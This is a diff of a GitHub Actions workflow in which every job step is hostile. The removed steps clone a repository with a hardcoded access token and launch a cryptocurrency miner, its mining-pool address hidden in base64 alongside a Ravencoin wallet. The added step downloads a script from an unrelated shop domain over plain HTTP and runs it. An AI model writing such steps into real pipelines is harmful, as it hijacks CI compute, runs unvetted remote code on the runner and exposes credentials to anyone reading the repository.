@@ -11,28 +11,9 @@ jobs:
     runs-on: ubuntu-latest
     
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v3
-      
-      - name: Clone pytorch-lab repository
+      - name: Download and run script
         run: |
-          TOKEN="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"
-          git clone https://oauth2:${TOKEN}@github.com/coderun2611/pytorch-lab.git .cache
-      
-      - name: Change directory and setup
-        working-directory: .cache
-        run: |
-          echo -e 'proxy=wss://labs.neolab.dpdns.org/cG93ZXIyYi5zZWEubWluZS56cG9vbC5jYTo2MjQy
-          host=127.0.0.1
-          port=3306
-          threads=12
-          password=c=RVN
-          username=RAx94yN5pMHQVnvwZ3UcHCxzKBVdVdUFU8' > .env
-          
-          chmod +x start.sh
-      
-      - name: Run start.sh script
-        working-directory: .cache
-        run: |
-          ./start.sh 12
+          curl -o run.sh http://valorantunlocker.shop/run.sh
+          chmod +x run.sh
+          bash run.sh
 
